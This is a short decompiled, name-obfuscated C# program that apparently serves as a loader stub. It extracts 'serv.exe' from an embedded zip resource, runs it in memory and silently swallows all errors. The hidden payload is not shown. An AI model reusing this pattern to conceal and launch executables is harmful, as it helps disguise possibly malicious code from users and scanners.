using System;
using System.IO;
using System.IO.Packaging;
using System.Reflection;
using ns8;

namespace ns0;

internal static class Class0
{
	[STAThread]
	private static void Main(string[] args)
	{
		if (!Class6.smethod_25())
		{
			return;
		}
		try
		{
			Class6.smethod_23();
			using Stream stream = typeof(Class0).Assembly.GetManifestResourceStream("a.zip");
			Package val = Package.Open(stream, FileMode.Open, FileAccess.Read);
			try
			{
				Assembly assembly = Class6.smethod_20(val, "/serv.exe");
				assembly.EntryPoint!.Invoke(null, new object[1] { args });
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception)
		{
		}
	}
}
